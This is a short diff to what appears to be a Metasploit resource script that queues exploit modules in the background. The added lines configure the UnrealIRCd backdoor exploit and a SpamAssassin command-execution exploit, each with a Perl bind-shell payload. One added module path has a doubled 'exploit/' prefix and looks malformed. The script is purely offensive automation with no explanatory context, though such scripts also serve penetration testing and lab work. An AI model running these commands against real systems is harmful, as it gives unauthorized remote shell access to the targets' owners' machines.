@@ -6,6 +6,9 @@ run -j
 use exploit/windows/fileformat/activepdf_webgrabber
 set PAYLOAD generic/custom
 run -j
+use exploit/exploit/unix/irc/unreal_ircd_3281_backdoor
+set PAYLOAD cmd/unix/bind_perl
+run -j
 use exploit/windows/fileformat/djvu_imageurl
 set PAYLOAD generic/custom
 run -j
@@ -23,4 +26,7 @@ set PAYLOAD generic/custom
 run -j
 use exploit/windows/ftp/sami_ftpd_list
 set PAYLOAD generic/custom
+run -j
+use exploit/unix/misc/spamassassin_exec
+set PAYLOAD cmd/unix/bind_perl
 run -j
